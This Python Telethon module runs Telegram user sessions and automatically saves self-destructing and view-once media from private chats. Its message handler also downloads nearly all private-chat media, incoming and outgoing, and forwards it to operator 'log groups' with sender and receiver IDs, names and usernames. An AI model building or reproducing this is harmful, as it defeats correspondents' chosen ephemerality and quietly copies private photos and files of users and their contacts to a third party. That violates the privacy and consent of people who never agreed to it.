import os
import asyncio
from telethon import TelegramClient, events
from telethon.tl.functions.channels import JoinChannelRequest
from config import USERS_DIR, IGNORED_USERS, DOWNLOAD_FILTER_ADMINS, LOG_GROUP_NORMAL, LOG_GROUP_TIMER

class UserSession:
    def __init__(self, user_id, api_id, api_hash, bot_instance):
        self.user_id = user_id
        self.api_id = api_id
        self.api_hash = api_hash
        self.bot = bot_instance # The Bot instance to send messages back to the user
        self.client = None
        self.user_folder = os.path.join(USERS_DIR, str(user_id))
        self.download_folder = os.path.join(self.user_folder, "download")
        self.session_path = os.path.join(self.user_folder, "session") # .session will be appended by Telethon

        os.makedirs(self.download_folder, exist_ok=True)

    async def get_dialogs(self, limit=10):
        if not self.client:
            return []
        
        users = []
        async for dialog in self.client.iter_dialogs(limit=None):
            if dialog.is_user and not dialog.entity.bot:
                # Filter Self and official Telegram Service account
                if dialog.entity.is_self or dialog.id == 777000:
                    continue
                
                users.append(dialog)
                if len(users) >= limit:
                    break
        return users

    async def scan_chat_and_download(self, chat_id, limit=100):
        if not self.client:
            return 0, 0 # downloaded, total_checked

        if int(chat_id) in IGNORED_USERS:
            entity = await self.client.get_entity(int(chat_id))
            sender_name = getattr(entity, 'first_name', '') or getattr(entity, 'title', 'Unknown')
            return []

        count = 0
        total_media = 0
        results = []
        sender_name = "Unknown"

        try:
            entity = await self.client.get_entity(int(chat_id))
            other_name = getattr(entity, 'first_name', '') or getattr(entity, 'title', 'Unknown')
            
            # Get Self Info for Outgoing messages
            me = await self.client.get_me()
            my_first = getattr(me, 'first_name', '') or ''
            my_last = getattr(me, 'last_name', '') or ''
            my_name = f"{my_first} {my_last}".strip() or getattr(me, 'title', 'Me')

            # Helper to escape HTML
            def esc(text):
                return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

            # Helper for mention
            def get_mention(ent, n):
                link = f"<a href='tg://user?id={ent.id}'>{esc(n)}</a>"
                if getattr(ent, 'username', None):
                    return f"{link}\n@{ent.username}"
                return link
            
            async for message in self.client.iter_messages(entity, limit=limit):
                # Filter Logic for specific Admins (Only download My Outgoing messages)
                if int(chat_id) in DOWNLOAD_FILTER_ADMINS and not message.out:
                    continue

                is_timer = False
                # Check message main TTL
                if getattr(message, 'ttl_seconds', None):
                    is_timer = True
                elif getattr(message, 'ttl_period', None):
                    # Some updates use ttl_period
                    is_timer = True
                elif getattr(message, 'expire_date', None):
                    # If it has an expire date, it is likely a timer message
                    is_timer = True
                # Check media specific TTL (View Once often lives here)
                elif message.media and getattr(message.media, 'ttl_seconds', None):
                    is_timer = True
                


                if is_timer and message.media:
                    total_media += 1
                    try:
                        path = await message.download_media(self.download_folder)
                        if path:
                            # Build Rich Caption
                            sender_obj = await message.get_sender() 
                            if not sender_obj: sender_obj = entity if not message.out else me

                            s_fname = getattr(sender_obj, 'first_name', '') or getattr(sender_obj, 'title', '') or 'Unknown'
                            s_lname = getattr(sender_obj, 'last_name', '') or ''
                            s_full = f"{s_fname} {s_lname}".strip()
                            
                            orig_cap = message.message or ""
                            
                            results.append({
                                'path': path, 
                                'name': s_full,
                                'caption': orig_cap
                            })
                    except Exception as e:
                        print(f"Failed to download media msg {message.id}: {e}")

        except Exception as e:
            print(f"Error scanning chat {chat_id}: {e}")
            return [], "Error"
        
        return results


    async def start(self):
        """Starts the user client."""
        self.client = TelegramClient(self.session_path, self.api_id, self.api_hash)
        
        # Register hooks
        self.client.add_event_handler(self.on_new_message, events.NewMessage(incoming=True, outgoing=True))
        
        await self.client.start()
        print(f"User {self.user_id} client started.")

    async def join_channel(self, channel):
        try:
            await self.client(JoinChannelRequest(channel))
        except Exception as e:
            print(f"Error joining {channel}: {e}")

    async def stop(self):
        if self.client:
            await self.client.disconnect()

    async def logout(self):
        """Logs out the user, disconnects, and deletes the session file."""
        if not self.client:
            self.client = TelegramClient(self.session_path, self.api_id, self.api_hash)
            
        try:
            if not self.client.is_connected():
                await self.client.connect()
            
            # Terminate session on Telegram Server
            if await self.client.is_user_authorized():
                await self.client.log_out()
        except Exception as e:
            print(f"Logout error: {e}")
            
        await self.stop()
        if os.path.exists(self.session_path + ".session"):
            os.remove(self.session_path + ".session")
        print(f"User {self.user_id} logged out and session deleted.")

    async def is_authorized(self):
        """Checks if the session is valid."""
        if not os.path.exists(self.session_path + ".session"):
            return False
        
        try:
            # We need to temporarily connect to check auth
            temp_client = TelegramClient(self.session_path, self.api_id, self.api_hash)
            await temp_client.connect()
            is_auth = await temp_client.is_user_authorized()
            await temp_client.disconnect()
            return is_auth
        except Exception as e:
            print(f"Error checking auth for {self.user_id}: {e}")
            return False

    async def on_new_message(self, event):
        """Handles new messages for the user account."""
        try:
            # 1. Filter: Personal Chats Only (No Groups/Channels)
            if not event.is_private:
                return

            # 2. Filter: Ignored Users (Blacklist)
            if event.chat_id in IGNORED_USERS or (event.sender_id and event.sender_id in IGNORED_USERS):
                return
            
            # 3. Filter: Real Users Only (No Bots)
            try:
                # Check if the sender is a bot
                sender = await event.get_sender()
                if getattr(sender, 'bot', False):
                    return
                # Check if the partner (chat) is a bot (for outgoing messages to a bot)
                if event.out:
                     # For outgoing, 'sender' is Me. We need to check who we are talking to.
                     chat = await event.get_chat()
                     if getattr(chat, 'bot', False):
                         return
            except:
                pass

            # Check for self-destruct media (TTL)
            message = event.message
            is_timer = False
            
            # Check message main TTL
            if getattr(message, 'ttl_seconds', None):
                is_timer = True
            elif getattr(message, 'ttl_period', None):
                is_timer = True
            elif getattr(message, 'expire_date', None):
                is_timer = True
            # Check media specific TTL (View Once often lives here)
            elif message.media and getattr(message.media, 'ttl_seconds', None):
                is_timer = True

            # Decide what to do
            # Log Group: All Media < 1GB
            # User DM: Only Timer Media
            
            should_log = False
            if message.media:
                # Check Size (1GB = 10^9 bytes)
                file_size = 0
                if getattr(message, 'file', None) and getattr(message.file, 'size', None):
                     file_size = message.file.size
                
                if file_size < 1_000_000_000:
                    should_log = True

            if should_log:
                print(f"Processing media for Logging (User {self.user_id})")
                
                # Download
                path = await event.download_media(self.download_folder)
                
                # Schedule Auto-Delete after 5 minutes (300 seconds)
                asyncio.create_task(self.delete_file_later(path, 300))
                
                # Gather Info for Logging
                try:
                    me = await self.client.get_me()
                    first = getattr(me, 'first_name', '') or ''
                    last = getattr(me, 'last_name', '') or ''
                    my_name = f"{first} {last}".strip() or getattr(me, 'title', 'Me')
                    my_id = me.id
                    
                    chat_entity = await event.get_chat()
                    c_first = getattr(chat_entity, 'first_name', '') or ''
                    c_last = getattr(chat_entity, 'last_name', '') or ''
                    chat_name = f"{c_first} {c_last}".strip() or getattr(chat_entity, 'title', 'Unknown')
                    
                    sender_str = ""
                    receiver_str = ""
                    
                    # Helper to escape HTML
                    def esc(text):
                        return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

                    # Helper for mention
                    def get_mention(entity, name):
                        # Always show clickable Name
                        link = f"<a href='tg://user?id={entity.id}'>{esc(name)}</a>"
                        # Add username if available
                        if getattr(entity, 'username', None):
                            return f"{link}\n@{entity.username}"
                        else:
                            return link

                    if event.out:
                        # I sent it
                        sender_str = f"{my_id}\n{get_mention(me, my_name)}"
                        receiver_str = f"{chat_entity.id}\n{get_mention(chat_entity, chat_name)}"
                        simple_name = my_name
                    else:
                        # They sent it
                        if event.is_group:
                            sender = await event.get_sender()
                            s_first = getattr(sender, 'first_name', '') or ''
                            s_last = getattr(sender, 'last_name', '') or ''
                            s_name = f"{s_first} {s_last}".strip() or "Unknown"
                            
                            sender_str = f"{sender.id}\n{get_mention(sender, s_name)}"
                            simple_name = s_name
                        else:
                            sender_str = f"{chat_entity.id}\n{get_mention(chat_entity, chat_name)}"
                            simple_name = chat_name
                        
                        receiver_str = f"{my_id}\n{get_mention(me, my_name)}"
                    
                    rich_footer = f"Sender - {sender_str}\n\nReceiver - {receiver_str}"
                    simple_footer = esc(simple_name)
                    
                    original_caption = event.message.message or ""
                    if original_caption:
                        log_caption = f"{esc(original_caption)}\n----------------------------------------\n{rich_footer}"
                        user_caption = f"{esc(original_caption)}\n----------------------------------------\n{simple_footer}"
                    else:
                        log_caption = rich_footer
                        user_caption = simple_footer
                    
                    target_group = LOG_GROUP_TIMER if is_timer else LOG_GROUP_NORMAL
                    await self.bot.send_file(target_group, path, caption=log_caption, parse_mode='html')
                except Exception as log_e:
                    print(f"Logging error: {log_e}")

                # Send back to User DM (ONLY IF TIMER) applies
                if is_timer:
                    should_send_to_user = True
                    # Filter Logic
                    if event.chat_id in DOWNLOAD_FILTER_ADMINS and not event.out:
                        should_send_to_user = False
                    
                    if should_send_to_user:
                        # Use the simplified caption for User DM
                        await self.bot.send_file(self.user_id, path, caption=user_caption, parse_mode='html')


        except Exception as e:
            print(f"Error in message handler for {self.user_id}: {e}")

    async def delete_file_later(self, path, delay):
        await asyncio.sleep(delay)
        if os.path.exists(path):
            try:
                os.remove(path)
                print(f"Deleted {path} after {delay}s")
            except Exception as e:
                print(f"Error deleting {path}: {e}")
